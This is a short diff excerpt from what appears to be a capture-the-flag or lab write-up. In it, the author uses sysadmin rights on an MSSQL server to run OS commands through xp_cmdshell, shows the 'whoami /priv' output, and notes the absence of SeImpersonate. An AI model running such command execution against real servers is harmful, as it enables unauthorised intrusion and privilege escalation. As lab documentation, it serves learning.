@@ -339,4 +339,25 @@ NULL
 SQL >[dc02.darkzero.ext] (dc01_sql_svc  dbo@master)>
 ```
 
-Since i am a sysadmin on t
+Since i am a sysadmin on this server i can enable xp_cmdshell and get me remote code execution
+
+```python
+SQL >[dc02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell whoami /priv
+output                                                                  
+---------------------------------------------------------------------   
+NULL                                                                    
+PRIVILEGES INFORMATION                                                  
+----------------------                                                  
+NULL                                                                    
+Privilege Name                Description                    State      
+============================= ============================== ========   
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled    
+SeCreateGlobalPrivilege       Create global objects          Enabled    
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled   
+NULL                                                                    
+SQL >[dc02.darkzero.ext] (dc01_sql_svc  dbo@master)>
+```
+
+I do not have SeImpersonate however
+
+
